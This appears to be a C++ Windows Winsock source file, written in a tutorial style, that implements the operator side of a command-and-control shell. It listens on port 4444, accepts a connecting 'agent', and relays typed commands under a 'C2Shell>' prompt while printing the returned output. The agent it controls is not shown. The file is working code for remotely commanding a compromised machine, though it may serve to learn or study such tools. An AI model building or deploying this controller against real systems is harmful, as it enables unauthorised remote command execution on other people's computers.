/*
Server Functions 
1. initialize WSA - WSAStartup()
2. Create a socket - socket()
3. Bind the Socket - bind()
4. listen on the Socket - listen()
5. Accept a connection - accept()
6. Send and Receive Data - recv() , send() , recvfrom() , sendto()
7. Disconnect - closesocket()
*/
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream> 
#include <winsock2.h> 
#include <string>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std; 

int main(){
    // 1. initialize winsock API
    WSADATA wsaData; 
    int wsInit = WSAStartup(MAKEWORD(2,2) , &wsaData);
    if(wsInit != 0){
        cerr << "[!] Winsock startup failed:  " << wsInit <<"\n"; 
        return 1; 
    }else{
        cout << "The Winosock dll found !" <<endl; 
        cout << "The Status : " << wsaData.szSystemStatus <<endl; 
    }

    //2. Create a socket 
    SOCKET listenSocket = socket(AF_INET , SOCK_STREAM , 6);
    if(listenSocket == INVALID_SOCKET){
        cerr << "[!] Socket Creatation Faild: " << WSAGetLastError() <<"\n";
        WSACleanup();
        return 1; 
    }

    //3.set up sockaddr_in struct 
    sockaddr_in serverAddr; 
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(4444); 
    
    //4. Bind a socket
    if(bind(listenSocket , (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR){
        cerr << "[!] Bind failed: " << WSAGetLastError() << "\n";
        closesocket(listenSocket);
        WSACleanup(); 
        return 1; 
    } 

    //5. Start listening
    if(listen(listenSocket , SOMAXCONN) == SOCKET_ERROR){
        cerr << "[!] Listen failed: " << WSAGetLastError() << "\n";
        closesocket(listenSocket);
        WSACleanup();
        return 1; 
    } 

    cout <<"[+] Waiting for incoming connection on port 4444...\n";

    //6. Accept a connection 
    SOCKET clientSocket; 
    sockaddr_in clientAddr; 
    int clientSize = sizeof(clientAddr);

    clientSocket =  accept(listenSocket,(sockaddr*)&clientAddr, &clientSize);
    if(clientSocket == INVALID_SOCKET){
        cerr << "[!] Accept failed: " << WSAGetLastError() << "\n";
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    cout << "[+] Client connected!\n";

    //7. loop to send commands and recieve output 
    char buffer[4096];
    string command; 

    while(true){
        cout<<"C2Shell>";
        getline(cin,command);

        //send command to agent 
        int sendResult = send(clientSocket , command.c_str(), command.size()+1 , 0);
        if(sendResult == SOCKET_ERROR){
            cerr << "[!] Send failed.\n";
            break;
        }

        if (command == "exit") break;

        //Receive output 
        ZeroMemory(buffer, 4096);
        int bytesReceived = recv(clientSocket, buffer, 4096, 0);
        if (bytesReceived > 0) {
            std::cout << buffer << "\n";
        }
    }

    // 8. Cleanup
        closesocket(clientSocket);
        closesocket(listenSocket);
        WSACleanup();

        return 0;

}